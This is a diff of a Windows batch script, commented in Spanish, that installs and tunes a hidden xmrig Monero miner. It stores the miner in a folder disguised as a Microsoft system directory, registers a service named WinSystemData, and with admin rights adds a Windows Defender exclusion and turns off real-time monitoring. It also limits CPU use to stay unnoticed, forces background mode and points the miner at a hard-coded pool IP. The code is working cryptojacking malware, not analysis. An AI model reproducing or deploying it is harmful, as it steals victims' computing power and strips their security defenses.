@@ -5,15 +5,6 @@ set VERSION=2.5
 net session >nul 2>&1
 if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)
 
-set WALLET=483i5F8iiUbC3aU6SEse5iNJU4aXDgwLig9owqAxdJFCcq3bk4ik4T3ZwdPHwAMydUEFx8cY9QSwcgqPJsUsM8seRqSMDRM
-
-for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
-call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
-if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
-if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
-exit /b 1
-:WALLET_LEN_OK
-
 if ["%USERPROFILE%"] == [""] (
   exit /b 1
 )
@@ -37,41 +28,37 @@ if not %errorlevel% == 0 (
   exit /b 1
 )
 
-where tasklist >NUL
-if not %errorlevel% == 0 (
-  exit /b 1
-)
+set "MINER_DIR=%USERPROFILE%\AppData\Local\Microsoft\Windows\SystemData"
 
-if %ADMIN% == 1 (
-  where sc >NUL
-  if not %errorlevel% == 0 (
-    exit /b 1
+rem Verificar si el miner ya esta instalado y funcionando
+if exist "%MINER_DIR%\xmrig.exe" (
+  "%MINER_DIR%\xmrig.exe" --help >NUL 2>NUL
+  if %ERRORLEVEL% equ 0 (
+    tasklist /fi "imagename eq xmrig.exe" | find "xmrig.exe" >NUL
+    if %ERRORLEVEL% equ 0 (
+      rem Miner ya esta funcionando, no hacer nada
+      exit /b 0
+    )
   )
 )
 
-set /a "EXP_MONERO_HASHRATE = (%NUMBER_OF_PROCESSORS% * 700 * 30 + 50) / 100 / 1000"
+rem Detectar nucleos fisicos del procesador
+for /f "tokens=2 delims==" %%i in ('wmic cpu get NumberOfCores /value 2^>NUL ^| find "="') do set PHYSICAL_CORES=%%i
+if not defined PHYSICAL_CORES set PHYSICAL_CORES=%NUMBER_OF_PROCESSORS%
 
-if [%EXP_MONERO_HASHRATE%] == [] ( 
-  exit /b 1
+rem Calcular porcentaje optimo segun nucleos fisicos
+if %PHYSICAL_CORES% LEQ 2 (
+    set CPU_USAGE=50
+) else if %PHYSICAL_CORES% EQU 4 (
+    set CPU_USAGE=25
+) else if %PHYSICAL_CORES% GEQ 6 (
+    set CPU_USAGE=20
 )
 
-if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
-set PORT=10001
-:PORT_OK
+set /a "EXP_MONERO_HASHRATE = (%PHYSICAL_CORES% * 700 * %CPU_USAGE% + 50) / 100"
 
-set "MINER_DIR=%USERPROFILE%\AppData\Local\Microsoft\Windows\SystemData"
+set /a "OPTIMAL_DIFF = %EXP_MONERO_HASHRATE% * 30"
+set DIFFICULTY=%OPTIMAL_DIFF%
 
 if %ADMIN% == 1 (
   powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -Force" >NUL 2>NUL
@@ -83,16 +70,6 @@ if %ADMIN% == 1 (
   powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >NUL 2>NUL
   timeout 3 >NUL
 
-)
-
-if exist "%MINER_DIR%\xmrig.exe" (
-  "%MINER_DIR%\xmrig.exe" --help >NUL 2>NUL
-  if %ERRORLEVEL% equ 0 (
-    tasklist /fi "imagename eq xmrig.exe" | find "xmrig.exe" >NUL
-    if %ERRORLEVEL% equ 0 (
-      exit /b 0
-    )
-  )
 )
 
 sc stop WinSystemData >NUL 2>NUL
@@ -173,121 +150,12 @@ exit /b 1
 :MINER_OK
 
 
-rem PASS y WALLET no necesarios para proxy
-
-rem Deteccion inteligente de CPU con nucleos fisicos y logicos
-rem Intentar con wmic primero
-where wmic >NUL 2>&1
-if %errorlevel% == 0 (
-    for /f "tokens=2 delims==" %%i in ('wmic cpu get NumberOfCores /value 2^>NUL ^| find "="') do set PHYSICAL_CORES=%%i
-    for /f "tokens=2 delims==" %%i in ('wmic cpu get NumberOfLogicalProcessors /value 2^>NUL ^| find "="') do set LOGICAL_CORES=%%i
-    for /f "tokens=2 delims==" %%i in ('wmic cpu get Name /value 2^>NUL ^| find "="') do set CPU_NAME=%%i
-) else (
-    rem Fallback usando PowerShell si wmic no esta disponible
-    for /f "usebackq" %%i in (`powershell -Command "Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty NumberOfCores"`) do set PHYSICAL_CORES=%%i
-    for /f "usebackq" %%i in (`powershell -Command "Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty NumberOfLogicalProcessors"`) do set LOGICAL_CORES=%%i
-    for /f "usebackq" %%i in (`powershell -Command "Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name"`) do set CPU_NAME=%%i
-)
-
-rem Si no se puede detectar con ninguno de los metodos, usar fallbacks
-if not defined PHYSICAL_CORES (
-    rem Fallback final: asumir que threads logicos = fisicos si no hay HT
-    set PHYSICAL_CORES=%NUMBER_OF_PROCESSORS%
-)
-if not defined LOGICAL_CORES (
-    set LOGICAL_CORES=%NUMBER_OF_PROCESSORS%
-)
-if not defined CPU_NAME (
-    set CPU_NAME=Unknown_CPU
-)
-
-rem Detectar tipo de procesador para optimizaciones especificas
-set CPU_BRAND=UNKNOWN
-echo %CPU_NAME% | findstr /i "Intel" >nul && set CPU_BRAND=INTEL
-echo %CPU_NAME% | findstr /i "AMD" >nul && set CPU_BRAND=AMD
-echo %CPU_NAME% | findstr /i "Ryzen" >nul && set CPU_BRAND=AMD_RYZEN
-echo %CPU_NAME% | findstr /i "Threadripper" >nul && set CPU_BRAND=AMD_THREADRIPPER
-
-rem Calcular threads disponibles (usar threads logicos para aprovechar HT)
-if %LOGICAL_CORES% GTR %PHYSICAL_CORES% (
-    set AVAILABLE_THREADS=%LOGICAL_CORES%
-    set CORES_TYPE=HT
-) else (
-    set AVAILABLE_THREADS=%PHYSICAL_CORES%
-    set CORES_TYPE=PHYSICAL
-)
-
-rem Logica de asignacion de CPU basada en configuracion detectada
-if %AVAILABLE_THREADS% LEQ 2 (
-    rem 1-2 threads: usar 50% para no afectar mucho
-    set CPU_USAGE=50
-) else if %AVAILABLE_THREADS% EQU 4 (
-    rem 4 threads: ajustar segun marca
-    if "%CPU_BRAND%"=="AMD_RYZEN" (
-        set CPU_USAGE=25
-    ) else (
-        set CPU_USAGE=25
-    )
-) else if %AVAILABLE_THREADS% EQU 6 (
-    rem 6 threads (ej: i5 6-core, Ryzen 5 3600): usar 33% (2 threads)
-    if "%CPU_BRAND%"=="AMD_RYZEN" (
-        set CPU_USAGE=33
-    ) else (
-        set CPU_USAGE=33
-    )
-) else if %AVAILABLE_THREADS% EQU 8 (
-    rem 8 threads (ej: i7 4-core HT, i5 8-core, Ryzen 7): usar 25% (2 threads)
-    if "%CPU_BRAND%"=="AMD_RYZEN" (
-        set CPU_USAGE=25
-    ) else (
-        set CPU_USAGE=25
-    )
-) else if %AVAILABLE_THREADS% EQU 12 (
-    rem 12 threads (ej: i7 6-core HT, Ryzen 9 3900X): usar 25% (3 threads)
-    if "%CPU_BRAND%"=="AMD_RYZEN" (
-        set CPU_USAGE=25
-    ) else if "%CPU_BRAND%"=="INTEL" (
-        set CPU_USAGE=25
-    ) else (
-        set CPU_USAGE=25
-    )
-) else if %AVAILABLE_THREADS% EQU 16 (
-    rem 16 threads (ej: i9 8-core HT, Ryzen 9 5950X): usar 25% (4 threads)
-    if "%CPU_BRAND%"=="AMD_RYZEN" (
-        set CPU_USAGE=25
-    ) else if "%CPU_BRAND%"=="INTEL" (
-        set CPU_USAGE=25
-    ) else (
-        set CPU_USAGE=25
-    )
-) else if %AVAILABLE_THREADS% EQU 24 (
-    rem 24 threads (ej: Ryzen 9 5900X, i9-12900K): usar 20% (5 threads)
-    if "%CPU_BRAND%"=="AMD_THREADRIPPER" (
-        set CPU_USAGE=20
-    ) else (
-        set CPU_USAGE=20
-    )
-) else if %AVAILABLE_THREADS% EQU 32 (
-    rem 32 threads (ej: Threadripper 2950X): usar 18% (6 threads)
-    set CPU_USAGE=18
-) else if %AVAILABLE_THREADS% GEQ 64 (
-    rem 64+ threads (ej: Threadripper PRO, Xeon): usar 15% para ser muy conservador
-    set CPU_USAGE=15
-) else if %AVAILABLE_THREADS% GEQ 20 (
-    rem 20+ threads: usar 20% para ser conservador
-    set CPU_USAGE=20
-) else (
-    rem Configuraciones no comunes: usar 30% como default
-    set CPU_USAGE=30
-)
-
-
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"94.72.119.111:3333\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"priority\": *\d*,', '\"priority\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"max-threads-hint\": *\d*,', '\"max-threads-hint\": %CPU_USAGE%,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"colors\": *true,', '\"colors\": false,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"user\": *\".*\",', ''} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"pass\": *\".*\",', ''} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
+powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"x+%DIFFICULTY%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"nicehash\": *false,', '\"nicehash\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 
 copy /Y "%MINER_DIR%\config.json" "%MINER_DIR%\config_background.json" >NUL
